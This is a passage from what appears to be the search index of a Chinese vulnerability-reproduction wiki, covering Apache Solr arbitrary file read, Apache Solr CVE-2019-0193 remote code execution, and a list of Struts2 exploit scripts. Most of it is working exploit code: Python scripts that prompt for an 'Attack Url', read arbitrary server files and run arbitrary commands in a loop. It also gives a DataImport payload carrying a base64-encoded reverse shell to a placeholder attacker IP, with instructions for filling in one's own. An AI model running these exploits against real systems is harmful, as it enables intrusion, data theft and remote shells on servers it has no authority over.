\u6210\u529f\u83b7\u5f97core_name,Url\u4e3a\uff1a\" + target_url + \"/solr/\" + core_name + \"/config \\033 [0m\" ) return core_name except : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , core_name ): vuln_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-type\" : \"application/json\" } data = '{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u51c6\u5907\u6587\u4ef6\u8bfb\u53d6...... \\033 [0m\" . format ( target_url )) if \"This\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_3 ( target_url , core_name , File_name ): vuln_url = target_url + \"/solr/ {} /debug/dump?param=ContentStreams\" . format ( core_name ) headers = { \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = 'stream.url=file:// {} ' . format ( File_name ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) if \"No such file or directory\" in response . text : print ( \" \\033 [31m[x] \u8bfb\u53d6 {} \u5931\u8d25 \\033 [0m\" . format ( File_name )) else : print ( \" \\033 [36m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( json . loads ( response . text )[ \"streams\" ][ 0 ][ \"stream\" ])) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) core_name = POC_1 ( target_url ) POC_2 ( target_url , core_name ) while True : File_name = str ( input ( \" \\033 [35mFile >>> \\033 [0m\" )) POC_3 ( target_url , core_name , File_name )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#goby--poc","text":"\u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Apache_Solr_Arbitrary_File_Read.json","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u53c2\u8003\u6587\u7ae0","text":"https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-0193/","text":"Apache Solr \u8fdc\u7a0b\u6267\u884c\u6f0f\u6d1e CVE-2019-0193 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2019 \u5e74 08 \u6708 01 \u65e5\uff0cApache Solr \u5b98\u65b9\u53d1\u5e03\u9884\u8b66\uff0cApache Solr DataImport \u529f\u80fd \u5728\u5f00\u542f Debug \u6a21\u5f0f\u65f6\uff0c\u53ef\u4ee5\u63a5\u6536\u6765\u81ea\u8bf7\u6c42\u7684\u201ddataConfig\u201d\u53c2\u6570\uff0c\u8fd9\u4e2a\u53c2\u6570\u7684\u529f\u80fd\u4e0e data-config.xml \u4e00\u6837\uff0c\u4e0d\u8fc7\u662f\u5728\u5f00\u542f Debug \u6a21\u5f0f\u65f6\u65b9\u4fbf\u901a\u8fc7\u6b64\u53c2\u6570\u8fdb\u884c\u8c03\u8bd5\uff0c\u5e76\u4e14 Debug \u6a21\u5f0f\u7684\u5f00\u542f\u662f\u901a\u8fc7\u53c2\u6570\u4f20\u5165\u7684\u3002\u5728 dataConfig \u53c2\u6570\u4e2d\u53ef\u4ee5\u5305\u542b script \u6076\u610f\u811a\u672c\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Apache Solr < 8.2.0 \u73af\u5883\u642d\u5efa \u00b6 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-0193 docker-compose build docker-compose up -d # \u521b\u5efa\u4e00\u4e2asolr\u6838\u5fc3test docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8983/solr/ \u6b63\u5e38\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u70b9\u51fb\u521a\u521a\u521b\u5efa\u7684test\u8fdb\u5165\u8c03\u8bd5 \u5c06\u4e0b\u9762\u7684POC\u4ee3\u7801\u586b\u5165 Debug-Mode \u4e2d <dataConfig> <dataSource type= \"URLDataSource\" /> <script> <![CDATA[ function poc(){ java.lang.Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}\"); } ]]> </script> <document> <entity name= \"stackoverflow\" url= \"https://stackoverflow.com/feeds/tag/solr\" processor= \"XPathEntityProcessor\" forEach= \"/feed\" transformer= \"script:poc\" /> </document> </dataConfig> \u6ce8\u610f POC \u6267\u884c\u7684\u4ee3\u7801\u4e2d\u7684base64\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\u8bf7\u7f6e\u6362\u6210\u81ea\u5df1\u7684ip\u5730\u5740\u5e76base64\u52a0\u5bc6\u586b\u5165 [!NOTE] bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 \u76f4\u63a5\u5982\u4e0a\u5199\u5165\u53cd\u5f39\u65e0\u53cd\u5e94\uff0c\u4e0d\u7a33\u5b9a\uff0c\u9700\u8981base64\u52a0\u5bc6\u5199\u624d\u80fd\u53cd\u5f39\u4e00\u4e2ashell \u70b9\u51fbEXecute\u6267\u884c\u4ee3\u7801 \u6210\u529f\u53cd\u5f39shell \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] POC\u4e0d\u652f\u6301\u53cd\u5f39shell\uff0c\u5982\u9700\u53cd\u5f39shell\uff0c\u8bf7\u6309\u5982\u4e0a\u6b65\u9aa4\u53cd\u5f39shell #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Solr < 8.2.0 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2019-0193.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami(\u547d\u4ee4\u6267\u884c) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try : response = requests . request ( \"GET\" , url = core_url , timeout = 10 ) core_name = list ( json . loads ( response . text )[ \"status\" ])[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u5f97core_name,Url\u4e3a\uff1a\" + target_url + \"/solr/\" + core_name + \"/config \\033 [0m\" ) return core_name except : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , core_name ): mode_url = target_url + \"/solr/\" + core_name + \"/admin/mbeans?cat=QUERY&wt=json\" response = requests . request ( \"GET\" , url = mode_url , timeout = 20 ) mode = dict ( dict ( list ( json . loads ( response . text )[ \"solr-mbeans\" ])[ 1 ])[ '/dataimport' ])[ 'class' ] if \"org.apache.solr.handler.dataimport.DataImportHandler\" in mode : print ( \" \\033 [32m[o] \u76ee\u6807Url,Dataimport\u6a21\u5757\u5f00\u542f \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u76ee\u6807Url,Dataimport\u6a21\u5757\u672a\u5f00\u542f \\033 [0m\" ) sys . exit ( 0 ) def POC_3 ( target_url , core_name , cmd ): vuln_url = target_url + \"/solr/\" + core_name + \"/dataimport\" headers = { 'Host' : target_url , 'User-Agent' : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , 'Accept' : \"application/json, text/plain, */*\" , 'Accept-Language' : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , 'Accept-Encoding' : \"zip, deflate\" , 'Referer' : \"\" + target_url + \"/solr/\" , 'Content-type' : \"application/x-www-form-urlencoded\" , 'X-Requested-With' : \"XMLHttpRequest\" , 'Content-Length' : \"1007\" , 'Connection' : \"close\" } payload = \"\"\" command=full-import&verbose=false&clean=false&commit=false&debug=true&core=test&name=dataimport&dataConfig= <dataConfig> <dataSource type=\"URLDataSource\"/> <script><![CDATA[ function poc(row){ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\" %s \").getInputStream())); var result = []; while(true) { var oneline = bufReader.readLine(); result.push( oneline ); if(!oneline) break; } row.put(\"title\",result.join(\" \\\\ n \\\\ r\")); return row; } ]]></script> <document> <entity name=\"entity1\" url=\"https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml\" processor=\"XPathEntityProcessor\" forEach=\"/RDF/item\" transformer=\"script:poc\"> <field column=\"title\" xpath=\"/RDF/item/title\" /> </entity> </document> </dataConfig> \"\"\" % cmd response = requests . request ( \"POST\" , url = vuln_url , data = payload , headers = headers , timeout = 30 ) try : get_message = list ( json . loads ( response . text )[ \"documents\" ])[ 0 ] message = dict ( get_message )[ 'title' ][ 0 ] print ( \" \\033 [32m[o] \u6f0f\u6d1e\u6210\u529f\u5229\u7528,\u54cd\u5e94\u4e3a \\n \\033 [0m\" , message ) except : print ( \" \\033 [31m[x] \u4ee3\u7801\u6267\u884c\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) core_name = POC_1 ( target_url ) POC_2 ( target_url , core_name ) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : exit ( 0 ) else : POC_3 ( target_url , core_name , cmd ) \u53c2\u8003\u6587\u7ae0 \u00b6 apache solr\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(cve-2019-0193)","title":"Apache Solr \u8fdc\u7a0b\u6267\u884c\u6f0f\u6d1e CVE-2019-0193"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-0193/#apache-solr-\u8fdc\u7a0b\u6267\u884c\u6f0f\u6d1e-cve-2019-0193","text":"","title":"Apache Solr \u8fdc\u7a0b\u6267\u884c\u6f0f\u6d1e CVE-2019-0193"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-0193/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2019 \u5e74 08 \u6708 01 \u65e5\uff0cApache Solr \u5b98\u65b9\u53d1\u5e03\u9884\u8b66\uff0cApache Solr DataImport \u529f\u80fd \u5728\u5f00\u542f Debug \u6a21\u5f0f\u65f6\uff0c\u53ef\u4ee5\u63a5\u6536\u6765\u81ea\u8bf7\u6c42\u7684\u201ddataConfig\u201d\u53c2\u6570\uff0c\u8fd9\u4e2a\u53c2\u6570\u7684\u529f\u80fd\u4e0e data-config.xml \u4e00\u6837\uff0c\u4e0d\u8fc7\u662f\u5728\u5f00\u542f Debug \u6a21\u5f0f\u65f6\u65b9\u4fbf\u901a\u8fc7\u6b64\u53c2\u6570\u8fdb\u884c\u8c03\u8bd5\uff0c\u5e76\u4e14 Debug \u6a21\u5f0f\u7684\u5f00\u542f\u662f\u901a\u8fc7\u53c2\u6570\u4f20\u5165\u7684\u3002\u5728 dataConfig \u53c2\u6570\u4e2d\u53ef\u4ee5\u5305\u542b script \u6076\u610f\u811a\u672c\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-0193/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Apache Solr < 8.2.0","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-0193/#\u73af\u5883\u642d\u5efa","text":"https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-0193 docker-compose build docker-compose up -d # \u521b\u5efa\u4e00\u4e2asolr\u6838\u5fc3test docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8983/solr/ \u6b63\u5e38\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-0193/#\u6f0f\u6d1e\u590d\u73b0","text":"\u70b9\u51fb\u521a\u521a\u521b\u5efa\u7684test\u8fdb\u5165\u8c03\u8bd5 \u5c06\u4e0b\u9762\u7684POC\u4ee3\u7801\u586b\u5165 Debug-Mode \u4e2d <dataConfig> <dataSource type= \"URLDataSource\" /> <script> <![CDATA[ function poc(){ java.lang.Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}\"); } ]]> </script> <document> <entity name= \"stackoverflow\" url= \"https://stackoverflow.com/feeds/tag/solr\" processor= \"XPathEntityProcessor\" forEach= \"/feed\" transformer= \"script:poc\" /> </document> </dataConfig> \u6ce8\u610f POC \u6267\u884c\u7684\u4ee3\u7801\u4e2d\u7684base64\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\u8bf7\u7f6e\u6362\u6210\u81ea\u5df1\u7684ip\u5730\u5740\u5e76base64\u52a0\u5bc6\u586b\u5165 [!NOTE] bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 \u76f4\u63a5\u5982\u4e0a\u5199\u5165\u53cd\u5f39\u65e0\u53cd\u5e94\uff0c\u4e0d\u7a33\u5b9a\uff0c\u9700\u8981base64\u52a0\u5bc6\u5199\u624d\u80fd\u53cd\u5f39\u4e00\u4e2ashell \u70b9\u51fbEXecute\u6267\u884c\u4ee3\u7801 \u6210\u529f\u53cd\u5f39shell","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-0193/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] POC\u4e0d\u652f\u6301\u53cd\u5f39shell\uff0c\u5982\u9700\u53cd\u5f39shell\uff0c\u8bf7\u6309\u5982\u4e0a\u6b65\u9aa4\u53cd\u5f39shell #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Solr < 8.2.0 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2019-0193.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami(\u547d\u4ee4\u6267\u884c) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try : response = requests . request ( \"GET\" , url = core_url , timeout = 10 ) core_name = list ( json . loads ( response . text )[ \"status\" ])[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u5f97core_name,Url\u4e3a\uff1a\" + target_url + \"/solr/\" + core_name + \"/config \\033 [0m\" ) return core_name except : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , core_name ): mode_url = target_url + \"/solr/\" + core_name + \"/admin/mbeans?cat=QUERY&wt=json\" response = requests . request ( \"GET\" , url = mode_url , timeout = 20 ) mode = dict ( dict ( list ( json . loads ( response . text )[ \"solr-mbeans\" ])[ 1 ])[ '/dataimport' ])[ 'class' ] if \"org.apache.solr.handler.dataimport.DataImportHandler\" in mode : print ( \" \\033 [32m[o] \u76ee\u6807Url,Dataimport\u6a21\u5757\u5f00\u542f \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u76ee\u6807Url,Dataimport\u6a21\u5757\u672a\u5f00\u542f \\033 [0m\" ) sys . exit ( 0 ) def POC_3 ( target_url , core_name , cmd ): vuln_url = target_url + \"/solr/\" + core_name + \"/dataimport\" headers = { 'Host' : target_url , 'User-Agent' : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , 'Accept' : \"application/json, text/plain, */*\" , 'Accept-Language' : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , 'Accept-Encoding' : \"zip, deflate\" , 'Referer' : \"\" + target_url + \"/solr/\" , 'Content-type' : \"application/x-www-form-urlencoded\" , 'X-Requested-With' : \"XMLHttpRequest\" , 'Content-Length' : \"1007\" , 'Connection' : \"close\" } payload = \"\"\" command=full-import&verbose=false&clean=false&commit=false&debug=true&core=test&name=dataimport&dataConfig= <dataConfig> <dataSource type=\"URLDataSource\"/> <script><![CDATA[ function poc(row){ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\" %s \").getInputStream())); var result = []; while(true) { var oneline = bufReader.readLine(); result.push( oneline ); if(!oneline) break; } row.put(\"title\",result.join(\" \\\\ n \\\\ r\")); return row; } ]]></script> <document> <entity name=\"entity1\" url=\"https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml\" processor=\"XPathEntityProcessor\" forEach=\"/RDF/item\" transformer=\"script:poc\"> <field column=\"title\" xpath=\"/RDF/item/title\" /> </entity> </document> </dataConfig> \"\"\" % cmd response = requests . request ( \"POST\" , url = vuln_url , data = payload , headers = headers , timeout = 30 ) try : get_message = list ( json . loads ( response . text )[ \"documents\" ])[ 0 ] message = dict ( get_message )[ 'title' ][ 0 ] print ( \" \\033 [32m[o] \u6f0f\u6d1e\u6210\u529f\u5229\u7528,\u54cd\u5e94\u4e3a \\n \\033 [0m\" , message ) except : print ( \" \\033 [31m[x] \u4ee3\u7801\u6267\u884c\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) core_name = POC_1 ( target_url ) POC_2 ( target_url , core_name ) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : exit ( 0 ) else : POC_3 ( target_url , core_name , cmd )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-0193/#\u53c2\u8003\u6587\u7ae0","text":"apache solr\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(cve-2019-0193)","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Exphub-Strtus2/","text":"About Apache Struts2 \u00b6 Python\u811a\u672c\u653e\u5728\u5f53\u524d\u76ee\u5f55\u7684POC\u6587\u4ef6\u5939\u4e2d Vulnerability list \u00b6 struts2-032_cmd.py Struts2 method \u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eGetShell\u5229\u7528\u811a\u672c(CVE-2016-3081) struts2-032_poc.py Struts2 method \u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c(CVE-2016-3081) struts2-045_cmd.py Struts2 Jakarta Multipart parser \u63d2\u4ef6\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c1(CVE-2017-5638) [\u4f7f\u7528] struts2-045-2_cmd.py Struts2 Jakarta Multipart parser \u63d2\u4ef6\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c2(CVE-2017-5638) [\u4f7f\u7528] struts2-052_cmd.py Struts2 REST \u63d2\u4ef6\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c(CVE-2017-9805) struts2-052_webshell.py Struts2 REST \u63d2\u4ef6\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u4e0a\u4f20Webshell\u811a\u672c(CVE-2017-9805) struts2-053_cmd.py Struts2 Freemarker \u6807\u7b7e\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u6f0f\u6d1e\u5229\u7528\u811a\u672c(CVE-2017-12611) struts2-057_cmd.py Struts2 Namespace \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c(CVE-2018-11776) Readme \u00b6 \u90e8\u5206\u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u8be6\u7ec6\u4f7f\u7528\u5206\u6790\u8bf7\u53c2\u8003 vulnerability-list \u4e2d\u7684[\u4f7f\u7528] - VER: \u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u5728\u5f71\u54cd\u8303\u56f4\u7684\u7248\u672c\u6ca1\u6709\u76f8\u5173\u6f0f\u6d1e - USE: \u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u5927\u90e8\u5206\u5199\u5728\u4e86\u811a\u672c\u91cc\uff0c\u6267\u884c\u5373\u53ef\u89c1 - EXP: \u811a\u672c\u5229\u7528\u793a\u4f8b\uff0c\u4ee5\u53ca\u6267\u884c\u6548\u679c - DES: \u90e8\u5206\u7279\u6b8a\u811a\u672c\u6587\u4ef6\u7684\u7279\u6b8a\u63cf\u8ff0 \u53c2\u8003\u6765\u6e90 \u00b6 ExpHub","title":"\u626b\u63cf\u5de5\u5177 Exphub-Strtus2.md"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Exphub-Strtus2/#about-apache-struts2","text":"Python\u811a\u672c\u653e\u5728\u5f53\u524d\u76ee\u5f55\u7684POC\u6587\u4ef6\u5939\u4e2d","title":"About Apache Struts2"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Exphub-Strtus2/#vulnerability-list","text":"struts2-032_cmd.py Struts2 method \u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eGetShell\u5229\u7528\u811a\u672c(CVE-2016-3081) struts2-032_poc.py Struts2 method \u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c(CVE-2016-3081) struts2-045_cmd.py Struts2 Jakarta Multipart parser \u63d2\u4ef6\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c1(CVE-2017-5638) [\u4f7f\u7528] struts2-045-2_cmd.py Struts2 Jakarta Multipart parser \u63d2\u4ef6\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c2(CVE-2017-5638) [\u4f7f\u7528] struts2-052_cmd.py Struts2 REST \u63d2\u4ef6\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c(CVE-2017-9805) struts2-052_webshell.py Struts2 REST \u63d2\u4ef6\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u4e0a\u4f20Webshell\u811a\u672c(CVE-2017-9805) struts2-053_cmd.py Struts2 Freemarker \u6807\u7b7e\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u6f0f\u6d1e\u5229\u7528\u811a\u672c(CVE-2017-12611) struts2-057_cmd.py Struts2 Namespace \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c(CVE-2018-11776)","title":"Vulnerability list"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Struts2/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Exphub-Strtus2/#readme","text":"\u90e8\u5206\u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u8be6\u7ec6\u4f7f\u7528\u5206\u6790\u8bf7\u53c2\u8003 vulnerability-list \u4e2d\u7684[\u4f7f\u7528] - VER: \u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u5728\u5f71\u54cd\u8303\u56f4\u7684\u7248\u672c\u6ca1\u6709\u76f8\u5173\u6f0f\u6d1e - USE: 